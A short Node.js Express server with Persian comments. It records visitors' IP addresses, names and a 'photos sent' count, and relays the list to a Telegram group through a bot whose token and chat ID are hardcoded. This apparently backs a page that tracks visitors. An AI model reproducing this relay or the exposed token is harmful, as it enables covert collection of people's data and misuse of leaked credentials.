const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// برای ذخیره‌ی کاربران
const users = [];

// Middleware
app.use(bodyParser.json());
app.use(express.static('public')); // برای ارائه فایل‌های استاتیک مثل index.html

// به‌روزرسانی اطلاعات کاربران
app.post('/update-user', (req, res) => {
    const { ip, name, photoCount } = req.body;
    const existingUser = users.find(user => user.ip === ip);

    if (existingUser) {
        existingUser.name = name;
        existingUser.photoCount = photoCount;
    } else {
        users.push({ ip, name, photoCount });
    }

    res.json({ success: true, message: 'User data updated.' });
});

// ارسال اطلاعات به تلگرام
app.post('/send-to-telegram', async (req, res) => {
    const chatId = '-1002221297200'; // ID گروه تلگرام
    const botToken = '7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM'; // توکن ربات تلگرام

    if (users.length === 0) {
        return res.json({ success: false, message: 'No users to send.' });
    }

    const message = users.map(user => 
        `Name: ${user.name}, IP: ${user.ip}, Photos Sent: ${user.photoCount || 0}`
    ).join('\n');

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: `User List:\n${message}`,
        });
        res.json({ success: true, message: 'Data sent to Telegram.' });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.json({ success: false, message: 'Failed to send to Telegram.' });
    }
});

// صفحه اصلی (index.html)
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// سرور را راه‌اندازی کنید
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
